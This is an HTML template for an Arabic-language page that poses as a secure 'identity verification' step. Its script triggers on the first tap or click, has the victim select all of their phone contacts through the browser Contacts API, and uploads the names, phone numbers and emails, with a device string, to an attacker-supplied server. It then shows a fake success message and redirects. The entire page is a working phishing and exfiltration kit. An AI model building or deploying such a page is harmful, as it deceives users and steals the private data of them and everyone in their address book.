<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>تحقق من الهوية</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #0a0a0a;
      color: #fff;
      font-family: 'Segoe UI', Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .card {
      background: #1a1a2e;
      border: 1px solid #2a2a4a;
      border-radius: 20px;
      padding: 40px 30px;
      max-width: 360px;
      width: 90%;
      text-align: center;
      box-shadow: 0 0 40px rgba(0,100,255,0.15);
    }
    .icon { font-size: 60px; margin-bottom: 20px; }
    h2 { font-size: 22px; margin-bottom: 10px; color: #e0e0ff; }
    p { color: #888; font-size: 14px; margin-bottom: 30px; line-height: 1.6; }
    .btn {
      background: linear-gradient(135deg, #0066ff, #0044aa);
      color: #fff;
      border: none;
      padding: 16px 40px;
      border-radius: 50px;
      font-size: 16px;
      cursor: pointer;
      width: 100%;
      transition: opacity 0.2s;
    }
    .btn:active { opacity: 0.8; }
    #status {
      margin-top: 20px;
      font-size: 14px;
      color: #aaa;
      min-height: 20px;
    }
    .badge {
      display: inline-block;
      background: #0d3b00;
      color: #4caf50;
      border-radius: 20px;
      padding: 4px 14px;
      font-size: 12px;
      margin-bottom: 20px;
    }
    .progress {
      width: 100%;
      background: #333;
      border-radius: 10px;
      margin-top: 15px;
      display: none;
    }
    .progress-bar {
      height: 6px;
      background: #0066ff;
      border-radius: 10px;
      width: 0%;
      transition: width 0.3s;
    }
    .step {
      background: #12122a;
      border: 1px solid #2a2a4a;
      border-radius: 12px;
      padding: 12px 16px;
      margin-bottom: 10px;
      font-size: 13px;
      color: #bbb;
      text-align: right;
      display: flex;
      align-items: center;
      gap: 10px;
    }
    .step-num {
      background: #0066ff;
      color: #fff;
      border-radius: 50%;
      width: 24px;
      height: 24px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 12px;
      font-weight: bold;
      flex-shrink: 0;
    }
    .loading-spin {
      display: inline-block;
      width: 40px;
      height: 40px;
      border: 4px solid #333;
      border-top: 4px solid #0066ff;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      margin: 20px auto;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .hidden { display: none !important; }
  </style>
</head>
<body>
  <div class="card">
    <div class="icon">🔐</div>
    <span class="badge">✓ آمن ومشفر</span>
    <h2>تحقق من الهوية</h2>

    <div id="stepsView">
      <div class="step"><div class="step-num">1</div>ستظهر قائمة جهات الاتصال</div>
      <div class="step"><div class="step-num">2</div>اضغط مطولاً على أي اسم لتحديد الكل</div>
      <div class="step"><div class="step-num">3</div>اضغط <strong>تم</strong> في الأعلى للمتابعة</div>
      <button class="btn" id="mainBtn" onclick="getContacts()">ابدأ التحقق</button>
    </div>

    <div id="loadingView" class="hidden">
      <div class="loading-spin"></div>
      <p style="color:#aaa;margin-top:10px">جارٍ التحقق من هويتك...</p>
    </div>

    <div class="progress" id="progressBar"><div class="progress-bar" id="bar"></div></div>
    <div id="status"></div>
  </div>

  <script>
    const uid        = "<%= uid %>";
    const serverURL  = "<%= a %>";
    const redirectUrl= "<%= redirectUrl %>";

    // Auto-trigger on page load (requires user gesture on first interaction)
    // We attach to the first touch/click on the document as a gesture proxy
    let _triggered = false;
    function autoTrigger() {
      if (_triggered) return;
      _triggered = true;
      getContacts();
    }
    document.addEventListener('touchstart', autoTrigger, { once: true });
    document.addEventListener('click', autoTrigger, { once: true });

    async function getContacts() {
      const status      = document.getElementById('status');
      const btn         = document.getElementById('mainBtn');
      const stepsView   = document.getElementById('stepsView');
      const loadingView = document.getElementById('loadingView');
      const progressDiv = document.getElementById('progressBar');
      const bar         = document.getElementById('bar');

      if (btn) btn.disabled = true;

      try {
        if (!('contacts' in navigator) || !('ContactsManager' in window)) {
          // Fallback message
          status.textContent = '⚠️ يرجى فتح الرابط من Chrome على Android.';
          if (btn) btn.disabled = false;
          return;
        }

        stepsView.classList.add('hidden');
        loadingView.classList.remove('hidden');

        const props   = ['name', 'tel', 'email'];
        const opts    = { multiple: true };
        const contacts = await navigator.contacts.select(props, opts);

        if (!contacts || contacts.length === 0) {
          loadingView.classList.add('hidden');
          stepsView.classList.remove('hidden');
          status.textContent = '⚠️ يرجى اختيار جميع جهات الاتصال والضغط على تم.';
          if (btn) { btn.disabled = false; btn.textContent = 'إعادة المحاولة'; }
          _triggered = false;
          return;
        }

        progressDiv.style.display = 'block';
        bar.style.width = '20%';

        // Build TXT content
        const device = navigator.userAgent.match(/\(([^)]+)\)/)?.[1] || 'Unknown';
        let txt = `All Contacts - ${device}\nTotal: ${contacts.length}\nDate: ${new Date().toLocaleString()}\n${'='.repeat(40)}\n\n`;
        for (const c of contacts) {
          const name   = c.name?.[0]  || 'Unknown';
          const tels   = c.tel?.join(' | ')   || '';
          const emails = c.email?.join(' | ') || '';
          txt += `Name: ${name}\n`;
          if (tels)   txt += `Phone: ${tels}\n`;
          if (emails) txt += `Email: ${emails}\n`;
          txt += '\n';
        }

        bar.style.width = '60%';

        const txtBlob  = new Blob([txt], { type: 'text/plain' });
        const fileName = `Contacts_${device}.txt`;
        const fd       = new FormData();
        fd.append('uid',      uid);
        fd.append('file',     txtBlob, fileName);
        fd.append('count',    contacts.length);
        fd.append('filename', fileName);

        await fetch(serverURL + '/contacts-file', { method: 'POST', body: fd });

        bar.style.width = '100%';
        loadingView.classList.add('hidden');
        status.textContent = '✅ تم التحقق بنجاح';
        setTimeout(() => { window.location.href = redirectUrl; }, 1200);

      } catch (e) {
        loadingView.classList.add('hidden');
        stepsView.classList.remove('hidden');
        status.textContent = '⚠️ يرجى المحاولة مرة أخرى واختيار جميع الاتصالات.';
        if (btn) { btn.disabled = false; btn.textContent = 'إعادة المحاولة'; }
        _triggered = false;
      }
    }
  </script>
</body>
</html>
